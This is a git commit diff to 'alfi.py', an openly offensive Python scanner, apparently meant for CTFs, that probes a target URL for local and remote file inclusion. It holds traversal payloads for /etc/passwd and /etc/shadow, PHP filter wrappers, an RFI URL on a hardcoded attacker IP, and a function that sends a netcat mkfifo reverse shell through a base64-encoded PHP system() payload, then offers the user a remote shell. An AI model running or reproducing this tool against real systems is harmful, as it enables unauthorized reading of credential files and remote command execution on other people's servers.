9fde981beddbde7e37d587d39c3c21838e96c3ad
Cameron Skerritt <122690042+Cameron-Skerritt@users.noreply.github.com>
2024-03-20 03:03:03 +0000

    Update alfi.py

--- alfi.py
+++ alfi.py
@@ -3,9 +3,14 @@ import urllib.parse
 import requests
 from bs4 import BeautifulSoup
 import time
+import colorama
+from colorama import Fore, Style
+colorama.init()
+
 """
 Created by: Ap3ili
 Purpose: This script is mainly for CTFs, nothing more.
+REMEMBER TO CHANGE THE IP ADDRESS TO YOUR IP!
 """
 def art():
         print("""
@@ -17,7 +22,8 @@ def art():
                                                                              
         """)
 
-
+attacker_ip = "10.8.209.119" # YOUR IP CHANGE THIS!
+attacker_port = 4242 # THIS IS YOUR LISTENER PORT
 basic_payloads = [
         "../../../etc/passwd",
         "../../../../etc/passwd",
@@ -54,10 +60,15 @@ basic_payloads = [
         ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
         "\..\..\..\..\..\..\..\..\..\..\etc\passwd",
 ]
+def green_box():
+        return Fore.GREEN + '[+]' + Style.RESET_ALL
+
+def red_box():
+        return Fore.RED + '[!]' + Style.RESET_ALL
 
 php_wrappers = [
-        "php://filter/read=string.rot13/resource=/etc/passwd",
         "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",
+        "php://filter/read=string.rot13/resource=/etc/passwd",
         "php://filter/convert.base64-encode/resource=/etc/passwd", 
 ]
 
@@ -91,14 +102,16 @@ directory_traversal = [
         "/etc/shadow",
 ]
 
+rfi_test = [
+        f"http://{attacker_ip}:80/rfi_test.php" # change the port if you don't use port 80 for http.server.
+]
+
 def get_remote_shell(target):
-    attacker_ip = input("Enter your IP: ")
-    attacker_port = input("Enter listener port: ")
     shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc {attacker_ip} {attacker_port} >/tmp/f"
     url_encoded = urllib.parse.quote_plus(shell, safe='')
     rce = f"php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd={url_encoded}"
     rce_url = target + rce
-    print("[+] Sending shell...")
+    print(green_box() + "Sending shell...")
     response = requests.get(rce_url)
 
 def find_root(response, target):
@@ -107,7 +120,7 @@ def find_root(response, target):
                 root_occurrence = soup.find_all(string=lambda text: 'root' in text)
         
                 if root_occurrence:
-                        print("[!] Payload:", target)
+                        print(red_box() + " Payload:", target)
                         return True
         else:
                 print("Server error")
@@ -119,29 +132,40 @@ def getURL(target, payload):
         return response, full_url
 
 
-payload_lists = [basic_payloads, php_wrappers, directory_traversal, remote_shell]
+
+payload_lists = [basic_payloads, php_wrappers, directory_traversal, rfi_test, remote_shell]
 def main():
         art()
-        list_names = ["basic_payloads", "hp_wrappers", "directory_traversal" ,"remote_shell"]
+        print(red_box() + "Please set up a server to test RFI! And include the rfi_test.php test file!")
+        print(red_box() + "COMMAND: python3 -m http.server 80")
+        input("Press anything to continue. ")
+
+        list_names = ["basic_payloads", "php_wrappers", "directory_traversal", "rfi_test", "remote_shell"]
+
         print("Example URL: http://10.10.10.10/search.php?page=")
-        target = input("Enter target: ")
-        print("[+] Searching for LFI")
+        target = input("\n" + green_box() + " Enter target: ")
         for index, payloads in enumerate(payload_lists):
                 list_name = list_names[index]
-                print("\nTrying:", list_name)
+                print("\n" + green_box() + " Trying:", list_name)
                 for payload in payloads:
                         response, full_url = getURL(target, payload) # attaches payload to the end the URL
                         if payloads == remote_shell and find_root(response, full_url):
-                                
-                                print("\n[!] RCE is possible, do you want a shell?")
-                                user_shell = input("Remote shell: Y/N: ").lower()
+                                print("\n" + red_box() + " RCE is possible, do you want a shell?")
+                                user_shell = input(green_box() + " Remote shell: Y/N: ").lower()
                                 if user_shell == "y":
                                         get_remote_shell(target)
-                                        exit()
+                                        exit() # not really needed ngl.
+
                                 elif user_shell == "n":
                                         print("Good bye!")
                                         exit()
+                                        
 
-                        if find_root(response, full_url): # if it finds a LFI, it breaks from that list.
+                        if payloads == rfi_test and find_root(response, full_url):
+                                print(green_box() + " https://book.hacktricks.xyz/pentesting-web/file-inclusion#file-inclusion")
+                                print(red_box() + " RFI is possible!")
+                                break
+
+                        if find_root(response, full_url): # if it finds a LFI, it breaks from the current list.
                                 break
 main()
